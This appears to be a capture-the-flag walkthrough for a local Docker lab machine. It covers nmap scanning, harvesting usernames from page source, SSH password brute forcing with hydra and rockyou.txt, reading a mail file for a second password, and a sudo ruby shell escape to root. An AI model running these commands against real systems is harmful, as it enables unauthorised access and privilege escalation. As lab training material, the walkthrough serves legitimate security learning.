![image](https://github.com/user-attachments/assets/942a080f-db21-4e2e-86bf-b463471fefa3)

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250123104046](https://github.com/user-attachments/assets/b3f900ee-3938-45f7-b054-391c4467bbc8)

## **We have a website and we are going to investigate**

![Pasted image 20250123104131](https://github.com/user-attachments/assets/7b54d8a6-33b2-4845-b1c1-5ad1a324e764)

## **The web site has nothing but if we look at the source code we can find some information**

![Pasted image 20250123104207](https://github.com/user-attachments/assets/cb6c36a3-994a-413a-97be-245609dc77fb)

## **we already have two possible users juan and camilo now we will apply fuzing to see if we can find hidden directories with more information.**

![Pasted image 20250123104438](https://github.com/user-attachments/assets/13c47273-cf20-4a4d-8a4b-7bd7315966e9)

## **But we do not have access**

![Pasted image 20250123104454](https://github.com/user-attachments/assets/300178dd-eecb-401f-a644-7ce4cc9a2105)

## **But we have not been able to find more information than two users so we will do a brute force attack for this we will create a file which contains the two possible users found and we will use a dictionary to find possible access passwords.**
```bash
nano users.txt
```
![Pasted image 20250123104723](https://github.com/user-attachments/assets/5dd0498a-1238-4afa-a643-05e28233b554)

## **Now we will do the brute force attack**
```bash
hydra -L /home/loestbazan/DockerLabs/MaquinasFaciles/Vacaciones/content/users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```
![Pasted image 20250123111820](https://github.com/user-attachments/assets/7be9c876-37dd-4851-a0fe-e3ae7a11db38)

## **After obtaining the password **password1** we will log in via ssh**
```bash
ssh camilo@172.17.0.2
```
![Pasted image 20250123110531](https://github.com/user-attachments/assets/48b45fb3-7324-43bb-920b-be29af769f70)

## **After a brief investigation in the directories we found a password for juan because if we looked in the source code we saw that he had left camilo an email.**
```bash
cd /var/mail/camilo/correo.txt
```
![Pasted image 20250123110725](https://github.com/user-attachments/assets/028852c6-815f-4c17-bf3a-f711cb80fc83)

## **We will now connect**
```bash
ssh juan@172.17.0.2
```
![Pasted image 20250123110851](https://github.com/user-attachments/assets/43661664-c4fc-4548-9b4f-94d5bd3ea4e3)
```bash
sudo -l
```
![Pasted image 20250123110931](https://github.com/user-attachments/assets/83c284a5-3a04-4feb-ae7a-cd7c9348736e)

## **On our GTFObins page, we are looking for a way to elevate privileges.**

![Pasted image 20250123111046](https://github.com/user-attachments/assets/fdabeddd-1f8a-4e14-850e-e1bda3c64c31)
![Pasted image 20250123111109](https://github.com/user-attachments/assets/c9308c4d-3a34-4319-b0db-b59dbdbac7e6)
```bash
sudo ruby -e 'exec "/bin/sh"'
```
![Pasted image 20250123111216](https://github.com/user-attachments/assets/be95d720-60be-422f-a919-97b178426f2a)
